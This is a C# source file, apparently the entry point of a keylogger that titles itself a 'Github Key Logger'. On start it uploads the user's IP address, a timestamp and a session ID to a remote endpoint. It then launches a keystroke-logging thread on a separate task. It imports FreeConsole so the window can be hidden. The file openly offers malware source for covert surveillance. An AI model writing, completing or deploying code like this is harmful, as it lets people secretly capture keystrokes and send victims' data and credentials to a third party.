using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;


class Program
{
    [DllImport("kernel32.dll")]
    private static extern bool FreeConsole();
    static void Main()
    {
        Console.Title = "spooferxbusiness | Github Key Logger";
        AppDomain.CurrentDomain.ProcessExit += helper.on_exit;  // this doesn't work

        if (!config.debug_mode)
        {
            web.upload_text($"[{web.get_ip()}] [{DateTime.Now}] User connected. ID: {config.sessionID}, Current delay: {Convert.ToString(config.delay)}");
            //FreeConsole();
        }


        Console.WriteLine("Connected. SessionID: " + config.sessionID);

        Task logger_task = Task.Run(() => { logger.init(); }); // initialize on a seperate thread

        if (logger_task.IsFaulted) {

            web.upload_text("Logger task failed.");
            Console.WriteLine("Logger task failed.");
            return;
        }
        else
        {
            web.upload_text("Started task successfully.");
            Console.WriteLine("Started task successfully.");
        }


        Console.WriteLine();
        Console.ReadLine();
        Environment.Exit(0);
    }
}

